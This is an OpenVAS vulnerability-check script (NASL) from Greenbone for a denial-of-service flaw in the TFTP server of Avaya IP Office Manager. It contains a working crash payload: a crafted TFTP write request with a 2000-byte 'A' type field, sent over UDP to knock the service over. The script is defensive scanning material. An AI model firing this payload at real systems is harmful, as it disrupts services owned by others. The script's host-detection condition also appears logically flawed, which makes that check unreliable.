###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_avaya_ip_office_mgr_tftp_dos.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Avaya IP Office Manager TFTP Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802011");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_bugtraq_id(47021);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Avaya IP Office Manager TFTP Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43819");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17045/");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);

  script_tag(name:"impact", value:"Successful exploitation will allow unauthenticated attackers to
  cause the application to crash.");
  script_tag(name:"affected", value:"Avaya Ip Office Manager 8.1, Other versions may also be
  affected.");
  script_tag(name:"insight", value:"The flaw is due to an error while handling certain crafted TFTP
  write requests, which can be exploited by remote unauthenticated attackers to
  crash an affected application");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Avaya IP Office Manager TFTP Server and is
  prone to denial of service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("tftp.inc");

port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

if(!get_udp_port_state(port)){
  exit(0);
}

## Access bin.cfg file and check it's contents
## to confirm it's Avaya TFTP
res = tftp_get(port:port, path:"bin.cfg");
if(isnull(res) && "avaya" >!< res) {
  exit(0);
}

## Create a crafted write request
crash = crap(data: "A", length: 2000);
req = raw_string( 0x00, 0x02 ) + ## Write Request Opcode
      "A" + raw_string( 0x00) +  ## Destination file name
      crash + raw_string( 0x00); ## Crafted "type"

## Create UDP scoket
soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

## Send Crafted UDP Packet to Avaya TFTP
send(socket:soc, data:req);
info = recv(socket:soc, length:1024);

res = tftp_get(port:port, path:"bin.cfg");
if(isnull(res) && "avaya" >!< res) {
  security_message(port: port, proto: "udp");
  exit(0);
}

exit(99);
